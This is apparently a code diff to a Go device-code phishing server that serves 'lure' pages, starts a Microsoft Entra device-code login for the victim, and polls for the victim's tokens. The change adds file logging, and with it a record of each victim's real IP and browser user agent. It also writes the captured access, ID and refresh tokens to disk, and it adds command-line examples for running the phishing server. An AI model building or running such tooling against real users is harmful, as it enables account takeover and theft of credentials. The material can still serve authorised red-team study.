@@ -25,6 +25,48 @@ const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb
 const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
 const DefaultTenant string = "common"
 
+type multiHandler struct {
+	handlers []slog.Handler
+}
+
+func (h *multiHandler) Enabled(ctx context.Context, level slog.Level) bool {
+	// Enabled if any of the handlers are enabled
+	for _, handler := range h.handlers {
+		if handler.Enabled(ctx, level) {
+			return true
+		}
+	}
+	return false
+}
+
+func (h *multiHandler) Handle(ctx context.Context, record slog.Record) error {
+	// Write to all handlers
+	for _, handler := range h.handlers {
+		if err := handler.Handle(ctx, record.Clone()); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func (h *multiHandler) WithAttrs(attrs []slog.Attr) slog.Handler {
+	// Create a new multiHandler with WithAttrs called on each handler
+	newHandlers := make([]slog.Handler, 0, len(h.handlers))
+	for _, handler := range h.handlers {
+		newHandlers = append(newHandlers, handler.WithAttrs(attrs))
+	}
+	return &multiHandler{handlers: newHandlers}
+}
+
+func (h *multiHandler) WithGroup(name string) slog.Handler {
+	// Create a new multiHandler with WithGroup called on each handler
+	newHandlers := make([]slog.Handler, 0, len(h.handlers))
+	for _, handler := range h.handlers {
+		newHandlers = append(newHandlers, handler.WithGroup(name))
+	}
+	return &multiHandler{handlers: newHandlers}
+}
+
 var (
 	address         string
 	customUserAgent string
@@ -37,6 +79,7 @@ var (
 	certFile        string
 	keyFile         string
 	blocklistFile   string
+	logFile         string
 )
 
 func init() {
@@ -52,6 +95,7 @@ func init() {
 	runCmd.Flags().StringVar(&certFile, "cert", "", "Certificate file for HTTPS (also requires --key)")
 	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
 	runCmd.Flags().StringVarP(&blocklistFile, "blocklist", "b", "", "Blocklist file containing IP addresses and CIDR ranges to block")
+	runCmd.Flags().StringVarP(&logFile, "log-file", "l", "", "File to write logs to (default is stdout only)")
 }
 
 var runCmd = &cobra.Command{
@@ -163,6 +207,12 @@ Examples:
   # Full example with blocklist
   DeviceCodePhishing server --blocklist blocklist.txt --domain example.com --cert cert.pem --key key.pem
 
+  # With log file
+  DeviceCodePhishing server --log-file dcp_web.log --client-id msteams
+
+  # Full example with blocklist and logging
+  DeviceCodePhishing server --blocklist blocklist.txt --log-file dcp_web.log --domain example.com
+
 Blocklist Format:
   The blocklist file should contain one IP address or CIDR range per line.
   Empty lines and lines starting with # are ignored.
@@ -179,6 +229,35 @@ Note: When using --domain, the domain must be properly configured to point to th
 Note: With --domain, all subdomains are automatically accepted
 Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if both are specified`,
 	Run: func(cmd *cobra.Command, args []string) {
+
+		// Configure logging first
+		var logHandlers []slog.Handler
+		stdoutHandler := slog.NewTextHandler(os.Stdout, nil)
+		logHandlers = append(logHandlers, stdoutHandler)
+
+		// If log file is specified, add file handler
+		if logFile != "" {
+			file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
+			if err != nil {
+				slog.Error("Failed to open log file", "file", logFile, "error", err)
+				os.Exit(1)
+			}
+
+			fileHandler := slog.NewTextHandler(file, nil)
+			logHandlers = append(logHandlers, fileHandler)
+
+			// Create a custom handler that writes to both stdout and file
+			logger := slog.New(&multiHandler{handlers: logHandlers})
+			slog.SetDefault(logger)
+
+			slog.Info("Logging to file enabled", "file", logFile)
+		}
+
+		// Set log level based on verbose flag
+		if verbose {
+			slog.SetLogLoggerLevel(slog.LevelDebug)
+		}
+
 		// Determine which user agent to use
 		finalUserAgent := customUserAgent
 		if userAgent != "" {
@@ -391,7 +470,13 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 
 func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		slog.Info("Lure opened", "clientId", clientId, "remoteAddr", r.RemoteAddr)
+		realClientIP := blocklist.GetClientIP(r)
+
+		slog.Info("Lure opened",
+			"clientId", clientId,
+			"remoteAddr", r.RemoteAddr,
+			"realIP", realClientIP,
+			"visitor-user-agent", r.UserAgent())
 
 		http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)
 
@@ -409,12 +494,12 @@ func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
 			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 			return
 		}
-		go startPollForToken(tenant, clientId, deviceAuth)
+		go startPollForToken(tenant, clientId, deviceAuth, realClientIP, r.UserAgent())
 		http.Redirect(w, r, redirectUri, http.StatusFound)
 	}
 }
 
-func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
+func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string) {
 	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
 
 	for {
@@ -428,7 +513,11 @@ func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceA
 		}
 
 		if result != nil {
-			slog.Info("Token received", "userCode", deviceAuth.UserCode, "clientId", clientId)
+			slog.Info("Token received",
+				"userCode", deviceAuth.UserCode,
+				"clientId", clientId,
+				"clientIP", clientIP,
+				"visitor-user-agent", visitorUserAgent)
 			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
 			slog.Info("ID TOKEN:", "token", result.IdToken)
 			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
